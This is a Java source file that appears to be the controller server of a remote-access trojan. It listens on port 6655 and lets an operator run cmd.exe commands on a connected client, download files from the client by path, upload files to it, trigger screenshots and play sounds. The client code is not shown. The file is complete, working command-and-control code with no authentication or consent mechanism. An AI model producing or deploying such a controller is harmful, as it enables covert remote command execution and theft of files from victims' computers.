package serverTest;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.Scanner;

public class server {
	
	// Scanner for user input
	static Scanner scanIn = new Scanner(System.in);

	// Variables for communication
	static ServerSocket serverSocket;
	static Socket server;
	static DataInputStream in;
	static DataOutputStream out;

	
	public static void main(String[] args) {
		
		// Close all connections when Server is shut down without command
		Runtime.getRuntime().addShutdownHook(new Thread(new Runnable() {
			public void run() {
				try {
					serverSocket.close();
					server.close();
					in.close();
					out.close();
				} catch (Exception e) {
					e.printStackTrace();
				}

			}
		}, "Shutdown-thread"));
		
		
		connectToClient();

		// Accept command from user until exit
		String command;

		while (true) {
			
			System.out.println("Ready for command:");
			command = scanIn.nextLine();
			
			switch (command) {
			case "cmd":
				cmd();
				break;
			case "upload":
				upload();
				break;
			case "download":
				download();
				break;
			case "screenshot":
				screenshot();
				break;
			case "sound":
				sound();
				break;
			case "EXIT_SERVER":
				safeExit();
				break;
			case "EXIT_CLIENT":
				exitClient();
				break;
			default:
				System.out.println("No such command, you fool!");
			}
		}
	}
	
	
	// Play sound (.wav)
	private static void sound() {
		System.out.println("Enter path to sound file:");
		String path = scanIn.nextLine();
		
		try {
			out.writeUTF("sound");
			out.writeUTF(path);
		} catch (Exception e) {
			e.printStackTrace();
			System.out.println("Error while sending notification!");
			return;
		}
		System.out.println("Client received notification!");
	}


	// Save screenshot as "MMDDHHmm"
	private static void screenshot() {
		try {
			out.writeUTF("screenshot");
		} catch (Exception e) {
			System.out.println("Error while sending notification!");
			return;
		}
		System.out.println("Client received notification!");
	}


	
	private static void exitClient() {
		try {
			out.writeUTF("exit");
		} catch (Exception e) {
			System.out.println("Error while sending notification!");
			return;
		}

	}

	
	// Exit safely by closing connections
	private static void safeExit() {
		try {
			serverSocket.close();
			server.close();
			in.close();
			out.close();
		} catch (Exception e) {
			System.out.println("Error closing connections!");
			System.exit(1);
		}
		System.exit(0);
	}

	
	// Download file from client, save as <fileLen>
	private static void download() {
		
		// Get file Path
		System.out.println("Enter path to file:");
		String fPath = scanIn.nextLine();
		
		// Send notification and file Path
		try {
			out.writeUTF("send");
			out.writeUTF(fPath);
		} catch (Exception e) {
			System.out.println("Error sending notification and path!");
			return;
		}
		
		System.out.println("Path " + fPath + " has been send! Receiving file length...");
		
		// Receive file length
		int fileLen = 0;
		try {
			fileLen = in.readInt();
		} catch (Exception e) {
			System.out.println("Error receiving file length!");
			return;
		}
		
		System.out.println(fileLen + " Bytes to download...");
		
		// Prepare writing to new file
		FileOutputStream fos;
		try {
			fos = new FileOutputStream(String.valueOf(fileLen));
		} catch (FileNotFoundException e) {
			e.printStackTrace();
			System.out.println("Error creating new file!");
			return;
		}
		
		// Download and safe file
		int read = 0, remaining = fileLen;
		byte[] buffer = new byte[4096];
		
		System.out.println("Downloading...");
		
		try {
			while((read = in.read(buffer, 0, Math.min(buffer.length, remaining))) > 0) {
				System.out.println(remaining + "Bytes remaining\r");
				remaining -= read;
				fos.write(buffer, 0, read);
			}
			fos.close();
		} catch (Exception e) {
			e.printStackTrace();
			System.out.println("Error while receiving and writing file!");
			return;
		}
		
		System.out.println("File recieved!               ");
	}

	
	// Upload file to client and save as <fileLen>
	private static void upload() {
		
		// Notify client
		try {
			out.writeUTF("receive");
		} catch (Exception e) {
			System.out.println("Error sending notification!");
			return;
		}

		// Get path to file
		System.out.println("Enter path to file:");
		String fPath = scanIn.nextLine();

		// Prepare reading from file
		System.out.println("Prepare reading from file...");
		File file;
		FileInputStream fis;
		int fileLen = 0;
		try {
			file = new File(fPath);
			fis = new FileInputStream(file);
			fileLen = (int) file.length();
		} catch (Exception e) {
			e.printStackTrace();
			System.out.println("Could not access File!");
			return;
		}
		
		// Send file length, read and upload file
		System.out.println("Uploading file...");
		
		byte[] buffer = new byte[fileLen];
		
		try {
			out.writeInt(fileLen);
			while (fis.read(buffer) > 0)
				out.write(buffer);
			fis.close();
		} catch (Exception e) {
			e.printStackTrace();
			System.out.println("Error while uploading file!");
			return;
		}
		
		System.out.println("File uploaded!");
	}


	// Control cmd.exe
	private static void cmd() {
		try {
			// Notify client
			out.writeUTF("cmd");
			
			// Get and send command
			System.out.println("Enter the command to execute:");
			String command = scanIn.nextLine();
			out.writeUTF(command);

			System.out.println("Command has been send");

			// Wait for incoming data
			int attempts = 0;
			while (in.available() < 2 && attempts < 1000) {
				Thread.sleep(100);
				attempts++;
			}
			if (attempts == 1000) {
				System.out.println("Timeout while waiting for Response!");
				return;
			}
			
			// Display response
			System.out.println(in.readUTF());
		} catch (Exception e) {
			System.out.println("Error during transmissions!");
			e.printStackTrace();
			return;
		}
	}

	// Establish connection to client
	private static void connectToClient() {

		try {
			System.out.println("Starting...");
			serverSocket = new ServerSocket(6655);
			System.out.println("Waiting for client...");
			server = serverSocket.accept();
			System.out.println("Connection established!");
			in = new DataInputStream(server.getInputStream());
			out = new DataOutputStream(server.getOutputStream());
		} catch (Exception e) {
			e.printStackTrace();
			System.out.println("Connection could not be established!");
			System.exit(1);
		}
	}
}
